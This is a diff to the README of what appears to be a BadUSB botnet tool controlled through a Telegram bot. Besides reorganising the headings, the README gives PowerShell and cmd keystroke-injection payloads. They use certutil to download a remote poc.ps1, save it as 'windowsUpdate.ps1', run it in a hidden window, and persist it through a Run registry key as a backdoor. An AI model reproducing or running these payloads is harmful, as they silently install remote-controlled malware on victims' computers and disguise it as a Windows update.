@@ -16,7 +16,13 @@ $githubScript = '<you_fork/poc.ps1>'
 
 >*To get ChatID: https://stackoverflow.com/questions/32423837/telegram-bot-how-to-get-a-group-chat-id*
 
-## Option 1 (with powershell)
+## Option 1: Powershell
+
+<p align="center">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/PowerShell_5.0_icon.png" height="100px" width="100px"/>
+</p>
+
+### Option 1.1: Simple
 
 ```powershell
 > [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -45,7 +51,7 @@ ENTER
 
 > Link to convert to .ino: https://malduino.com/converter/
 
-## Option 2 (with powershell and backdoor)
+### Option 1.2: Backdoor
 
 ```powershell
 > reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
@@ -73,24 +79,31 @@ ENTER
 
 > Link to convert to .ino: https://malduino.com/converter/
 
-## Option 3 (with cmd)
+## Option 2: CMD
+
+<p align="center">
+    <img src="https://winaero.com/blog/wp-content/uploads/2015/09/console-cmd-icon.png" height="100px" width="100px"/>
+</p>
+
+### Option 2.1: Simple
+
 Windows Powershell is too slow at startup, so we can use cmd to download the '.ps1' file and execute it. To download a file with cmd, we can use two options: ```bitsadmin``` or ```certutil.exe```. (Certutil is not installed by default on XP/Win2003 but is avaialble on the newer windows versions. For XP/2003 you'll need the Admin Tool Pack for windows server 2003).
 
-### Syntax
+#### Syntax
 
 ```cmd
 bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip
 certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
 ```
 
-### Example
+#### Example
 
 ```cmd
 > certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" Documents\windowsUpdate.ps1
 > powershell.exe -windowstyle hidden -file Documents\windowsUpdate.ps1
 ```
 
-## Option 4 (with cmd and backdoor)
+### Option 2.2: Backdoor
 
 ```cmd
 > certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" Documents\windowsUpdate.ps1
